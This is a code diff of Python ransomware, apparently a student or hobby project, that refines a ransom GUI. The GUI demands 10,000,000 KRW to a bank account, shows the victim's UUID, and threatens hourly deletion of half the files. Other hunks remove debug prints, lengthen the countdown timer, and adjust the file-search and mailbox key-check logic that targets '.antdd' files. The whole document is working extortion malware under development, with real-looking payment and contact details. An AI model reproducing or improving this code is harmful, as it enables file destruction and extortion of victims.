@@ -217,10 +217,11 @@ class MyTk:
                                          "\nYour photos, documents, etc..."
                                          "\nBut, don't worry! I have not deleted them yet :D"
                                          "\nYou have some time to pay 10,000,000KRW in our account to get the decryption key."
+                                         "\nSend the money to the account below, and send the details and your UUID to the below e-mail."
                                          "\nOUR ACCOUNT : KB 786102-00-040854"
-                                         "\nIf you send money, send an e-mail with your account at this address."
                                          "\nOUR E-MAIL ADDRESS : secureantdd@gmail.com"
-                                         "\nEvery hour half of all files will be deleted."
+                                         "\nYOU UUID : "+str(UUID)+
+                                         "\nIf you dont, every hour half of all files will be deleted."
                                          "\n------WARNING------"
                                          "\nDo not force-terminate this program."
                                          "\nYou will NEVER decrypt your files."
@@ -270,21 +271,6 @@ class MyTk:
 
 
     def finalGui(self):
-        print("디버깅1")
-        '''
-        self.l_timer.destroy()
-        self.l_input.destroy()
-        self.password.destroy()
-        self.pwbutton.destroy()
-        self.l_thanos.destroy()
-
-        self.l_text.config(text="\nYour files have been decrypted! Thank you, idiot.\n\n", fg="red",
-                           font='Helvetica 24 bold')
-        print("디버깅2")
-        self.final_image = tkinter.PhotoImage(file="../ui/final_thanos.png")
-        self.l_final = tkinter.Label(self.window, image=self.final_image, padx=10, pady=50)
-        self.l_final.pack()
-'''
         self.l_timer.destroy()
         self.l_input.destroy()
         self.password.destroy()
@@ -338,8 +324,6 @@ def startTimer(gui, path, ext=None):
     antdd_filelist = []
 
     enc_search_dir(antdd_filelist, path)
-    for i in antdd_filelist:
-        print(i)
 
     if len(antdd_filelist) == 0:
         gui.allRemovePrint()
@@ -355,7 +339,7 @@ def startTimer(gui, path, ext=None):
     gui.listWindow.lift()
     gui.list.pack()
 
-    clock(gui, 10, antdd_filelist)
+    clock(gui, 300, antdd_filelist)
 
 
 def clock(gui, sec, antdd_filelist):
@@ -431,8 +415,6 @@ class RealMain:
         enc_targetlist = []
         search_dir(enc_targetlist, os.getcwd())
 
-        for i in enc_targetlist:
-            print('run=>',i)
 
         for enc_target in enc_targetlist:
             if enc_target.split('.')[-1] == 'antdd':
@@ -470,7 +452,6 @@ class RealMain:
             if uuid == str(UUID):
                 # 만약 key(메일에 들어있던 키) 와 gui_input(입력받은 값) 이 같다면
                 if key.strip() == gui_input.strip():
-                    print("들어옴2")
                     # 해당 메일 삭제
                     server.dele(i + 1)
                     server.quit()
